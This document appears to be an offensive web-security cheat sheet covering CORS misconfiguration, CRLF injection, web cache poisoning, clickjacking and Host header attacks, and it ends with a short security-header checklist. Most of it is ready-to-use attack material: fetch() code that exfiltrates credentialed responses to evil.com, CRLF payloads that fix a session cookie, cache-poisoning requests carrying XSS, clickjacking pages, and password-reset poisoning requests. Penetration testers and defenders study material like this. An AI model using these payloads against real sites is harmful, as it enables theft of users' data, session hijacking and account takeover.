# CORS, CRLF Injection, and Cache Poisoning

## CORS Misconfiguration

### Origin Reflection

**When**: Server reflects the `Origin` header in `Access-Control-Allow-Origin`.

```javascript
// Attacker page at evil.com
fetch('https://target.com/api/sensitive', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(data)}));
```

If the server responds with `Access-Control-Allow-Origin: https://evil.com`
and `Access-Control-Allow-Credentials: true`, the attacker reads the response.

### Null Origin

```html
<!-- sandbox iframe sends Origin: null -->
<iframe sandbox="allow-scripts" src="data:text/html,
  <script>
    fetch('https://target.com/api/data', {credentials: 'include'})
      .then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+btoa(d)));
  </script>
">
```

If the server allows `Origin: null`, this bypasses domain restrictions.

### Subdomain Wildcard

```
Access-Control-Allow-Origin: *.target.com
```

If the attacker controls any subdomain (via XSS, subdomain takeover, or
dangling DNS), they can read cross-origin responses.

### Pre-Flight Bypass

Simple requests (GET, POST with form content types) skip pre-flight.
If the API accepts `Content-Type: text/plain` or URL-encoded body,
pre-flight is not triggered.

## CRLF Injection

**When**: User input is included in HTTP response headers without
sanitizing `\r\n` (carriage return, line feed).

### Header Injection

```
# Input: value%0d%0aX-Injected: true
# Response header becomes:
Set-Cookie: value
X-Injected: true
```

### Response Splitting

```
# Input: value%0d%0a%0d%0a<html><body>injected</body></html>
# Injects a complete HTTP response body after the headers
```

### Session Fixation via CRLF

```
# Inject Set-Cookie header
?param=value%0d%0aSet-Cookie:%20session=attacker_controlled
```

## Web Cache Poisoning

### Unkeyed Header Poisoning

**When**: The cache key doesn't include a header that affects the response.

```http
# X-Forwarded-Host affects rendered URLs but isn't in the cache key
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# If the response includes: <script src="https://evil.com/script.js">
# And the response is cached for all users: XSS via cache
```

### Unkeyed Query Parameter

```http
# utm_content affects response but not cache key
GET /?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com
```

### Cache Key Normalization

```http
# Different URL encodings that normalize to the same cache key
# but produce different server-side behavior
GET /page?q=test HTTP/1.1        # normal
GET /page?q=test%20 HTTP/1.1     # space in query
```

### Fat GET / Cache Deception

```http
# If the cache stores GET responses and the origin treats
# GET-with-body like POST:
GET /api/profile HTTP/1.1
Content-Type: application/json

{"action": "get_sensitive_data"}
```

### Cache Deception

Trick a victim into requesting a URL that gets cached with their
sensitive data:

```
# Send victim a link to:
https://target.com/profile.css
# If the origin returns the profile page (ignoring .css extension)
# and the cache stores it (based on .css extension):
# The attacker can then retrieve the cached profile page
```

## DoubleClickjacking (2024)
**When**: Target has `X-Frame-Options` / `frame-ancestors` CSP (blocks classic clickjacking) but allows popups. | Bypasses ALL known clickjacking mitigations.
```html
<!-- Attacker page: two clicks exploit the popup/opener relationship -->
<button id="btn" onclick="
  var w = window.open('https://target.com/settings');
  // First click opens popup with target page
  setTimeout(() => {
    // Rewrite attacker page to show 'confirm' button over target's sensitive button
    w.location = 'https://target.com/delete-account';  // or any action page
    document.getElementById('btn').innerText = 'Confirm';
    document.getElementById('btn').onclick = () => {
      // Second click lands on the target page in the popup
      // because the popup now shows the action page
    };
  }, 500);
">Click here for prize</button>
```
**Mechanism**: First click opens a popup (allowed by most CSPs). Between clicks, the attacker redirects the popup to the sensitive page. The second click lands on the popup, clicking the real button. X-Frame-Options doesn't protect popups.

## Clickjacking

```html
<iframe src="https://target.com/settings" style="opacity:0; position:absolute; top:0; left:0;">
</iframe>
<button style="position:absolute; top:300px; left:200px;">Click me!</button>
```

**Prevention check**: Look for `X-Frame-Options` or
`Content-Security-Policy: frame-ancestors` headers.

## Host Header Attacks

```http
# Password reset poisoning
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
# Reset link sent to victim contains evil.com URL
```

```http
# Virtual host routing bypass
GET /admin HTTP/1.1
Host: localhost
# May bypass host-based access controls
```

## Security Header Checklist

| Header | Purpose | Attack if Missing |
|---|---|---|
| `X-Frame-Options` | Prevent framing | Clickjacking |
| `Content-Security-Policy` | Script execution control | XSS |
| `X-Content-Type-Options: nosniff` | Prevent MIME sniffing | Content-type confusion |
| `Strict-Transport-Security` | Force HTTPS | SSL stripping |
| `Referrer-Policy` | Control Referer leakage | Token leakage |
| `Permissions-Policy` | Restrict browser features | Feature abuse |
